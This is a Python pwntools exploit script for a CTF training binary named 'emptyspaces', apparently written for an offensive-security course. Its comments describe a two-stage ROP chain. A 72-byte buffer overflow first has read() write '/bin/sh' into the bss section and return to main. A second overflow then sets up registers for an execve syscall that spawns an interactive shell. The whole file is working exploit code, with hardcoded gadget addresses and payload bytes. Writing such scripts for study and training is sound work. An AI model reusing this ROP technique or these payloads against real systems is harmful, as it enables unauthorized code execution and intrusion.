from pwn import *

# The rop chain is done in this way: first we fill for 72 chars the buffer in order to arrive to sEIP, here I start
#the chain preparing the register for the read that is executed in the function read of the program where I save
# the string /bin/sh in bss(0x6b6000). Then I put on the stack the address of main function to repeat the execution
# and in this execution i fill again the buffer fror 72 chars and then I put the gadgets to write the registers
# useful for execve syscall.

context.arch = 'amd64'

p = process("./emptyspaces")
#p = remote("bin.training.offdef.it", 4006)

gdb.attach(p,"""
    b* 0x0400BCE
""")
input("wait")

main_addr = 0x0400b95
main_addr = p64(main_addr)
read_addr = 0x04497b0
read_addr = p64(read_addr)
binsh = 0x6b6000
binsh = p64(binsh)
pop_rax = 0x04155a4
pop_rax = p64(pop_rax)
pop_rsi = 0x0410133
pop_rsi = p64(pop_rsi)
pop_rdx = 0x044bd36
pop_rdx = p64(pop_rdx)
pop_rdi = 0x0400696
pop_rdi = p64(pop_rdi)
syscall = 0x040128c
syscall = p64(syscall)
pop_rdi_syscall = 0x044400d
pop_rdi_syscall = p64(pop_rdi_syscall)
pop_rdx_rsi = 0x044bd59
pop_rdx_rsi = p64(pop_rdx_rsi)

p.send(b"\x41"*72 + pop_rdx_rsi + p64(0x7) + binsh + pop_rdi + p64(0x0) + read_addr + main_addr + p64(0x0) + b"\x00/bin/sh")
'''p.send(pop_rdx_rsi)
p.send(p64(0x7))
p.send(binsh)
p.send(pop_rdi)
p.send(p64(0x0))
p.send(read_addr)
p.send(main_addr)
p.send(p64(0x0))
p.send(b"\x00/bin/sh")'''
p.send(b"\x41"*72 + pop_rdx_rsi + p64(0x0) + p64(0x0) + pop_rax + p64(0x3b) + pop_rdi + binsh + syscall)
'''p.send(pop_rdx_rsi)
p.send(p64(0x0))
p.send(p64(0x0))
p.send(pop_rax)
p.send(p64(0x3b))
p.send(pop_rdi)
p.send(binsh)
p.send(syscall)'''

p.interactive()
